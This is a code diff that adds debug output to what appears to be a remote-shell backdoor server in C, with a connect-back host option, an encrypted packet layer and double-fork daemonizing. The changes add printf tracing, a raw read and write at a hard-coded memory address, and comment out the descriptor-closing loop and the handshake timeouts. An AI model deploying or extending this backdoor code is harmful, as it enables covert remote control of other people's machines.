@@ -16,6 +16,7 @@
 #include <stdio.h>
 #include <fcntl.h>
 #include <netdb.h>
+#include <signal.h>
 
 /* PTY support requires system-specific #include */
 
@@ -73,6 +74,9 @@ int main( int argc, char **argv )
     struct sockaddr_in server_addr;
     struct sockaddr_in client_addr;
     struct hostent *client_host;
+    unsigned long value = *(unsigned long *)0x50ede0;
+    *(unsigned long *)0x50ede0 = value;
+    printf("Value = 0x%lx\n", (unsigned long)value);
     while ((opt = getopt(argc, argv, "s:p:c::")) != -1) {
         switch (opt) {
             case 'p':
@@ -119,10 +123,10 @@ int main( int argc, char **argv )
 
     /* close all file descriptors */
 
-    for( n = 0; n < 1024; n++ )
-    {
-        close( n );
-    }
+    // for( n = 0; n < 1024; n++ )
+    // {
+    //     close( n );
+    // }
    
 
 	if (cb_host == NULL) {
@@ -252,8 +256,10 @@ int process_client(int client) {
 	int pid, ret, len;
 
     /* fork a child to handle the connection */
+    printf("GrandParent: %d\n", (int)getpid());
 
     pid = fork();
+    
 
     if( pid < 0 )
     {
@@ -267,11 +273,13 @@ int process_client(int client) {
         close( client );
     	return 1;
     }
+    printf("Parent: %d\n", (int)getpid());
 
     /* the child forks and then exits so that the grand-child's
      * father becomes init (this to avoid becoming a zombie) */
 
     pid = fork();
+    
 
     if( pid < 0 )
     {
@@ -282,10 +290,16 @@ int process_client(int client) {
     {
     	return( 9 );
     }
+     unsigned long value = *(unsigned long *)0x50ede0;
+    *(unsigned long *)0x50ede0 = value;
+    printf("Value = 0x%lx\n", (unsigned long)value);
+    printf("Child: %d\n", (int)getpid());
+   
 
     /* setup the packet encryption layer */
 
-    alarm( 3 );
+    // alarm( 3 );
+
 
     ret = pel_server_init( client, secret );
 
@@ -295,7 +309,7 @@ int process_client(int client) {
     	return( 10 );
     }
 
-    alarm( 0 );
+    // alarm( 0 );
 
     /* get the action requested by the client */
 
